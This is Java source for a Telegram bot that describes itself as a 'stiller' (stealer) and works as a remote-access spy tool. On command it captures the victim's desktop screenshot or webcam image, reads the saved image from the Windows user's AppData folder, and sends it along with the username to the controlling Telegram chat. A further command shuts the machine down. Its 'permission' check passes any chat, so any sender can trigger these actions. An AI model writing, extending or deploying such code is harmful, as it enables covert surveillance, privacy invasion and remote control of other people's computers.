import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.File;
import java.io.IOException;
import java.util.Map;

public class Hello extends TelegramLongPollingBot {


    @Override
    public String getBotUsername() {
        return NAME;
    }

    @Override
    public String getBotToken() {
        return TOKEN;
    }

    @Override
    public void onUpdateReceived(Update update) {
        String command = update.getMessage().getText();
        command.toLowerCase();

        if (command.equals("/run") || command.equals("/start") || command.equals("/menu") || command.startsWith("/open")
        ) {
            SendMessage response = new SendMessage();
            String message = "Hello im work as a stiller do you want /screen /webcam ?";
            response.setChatId(update.getMessage().getChatId().toString());
            response.setText(message);
            try {
                execute(response);
            } catch (TelegramApiException e) {
                e.printStackTrace();
            }

        } else {
            try {
                SendMessage response = new SendMessage();
                response.setChatId(update.getMessage().getChatId().toString());
                SendPhoto photo = new SendPhoto();

                InputFile file;
                Map<String, String> map = System.getenv();


                switch (command) {

                    case "/screen":
                        if (!response.getChatId().equals("")) {
                            photo.setChatId(update.getMessage().getChatId().toString());
                            Starter.callScreen();
                            Thread.sleep(2000);
                            file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Screenshot\\\\boba.jpg"));
                            System.out.println("Хочу достать из: " + file.getAttachName());
                            photo.setPhoto(file);
                            response.setChatId(update.getMessage().getChatId().toString());
                            response.setText("Screen dekstop from PC: " + map.get("USERNAME"));
                            execute(response);
                            execute(photo);
                        }
                        else {
                            response.setText("You not have permission by this bot");
                            execute(response);
                        }
                        break;
                    case "/webcam":
                        if (!response.getChatId().equals("")) {
                            photo.setChatId(update.getMessage().getChatId().toString());
                            Starter.callCam();
                            Thread.sleep(2000);
                            file = new InputFile(new File("C:\\\\Users\\\\" + map.get("USERNAME") + "\\\\AppData\\\\Roaming\\\\saiNick\\\\Cam\\\\boba.png"));
                            photo.setPhoto(file);
                            response.setChatId(update.getMessage().getChatId().toString());
                            response.setText("Webcam dekstop from PC: " + map.get("USERNAME"));
                            execute(response);
                            execute(photo);
                        }
                        else {
                            response.setText("You not have permission by this bot");
                            execute(response);
                        }
                        break;
                    case "/offpc":
                        if (!response.getChatId().equals("")) {
                            offPc();
                        }else{
                            response.setText("You not have permission by this bot");
                        execute(response);}
                        break;
                    default:
                        response.setText("Bad command");
                        execute(response);
                }}
               catch(Exception e){

                }
            }
        }


    public void offPc() throws IOException {
        String[] cm = {"shutdown", "-h"};
        Runtime.getRuntime().exec(cm);
    }
}
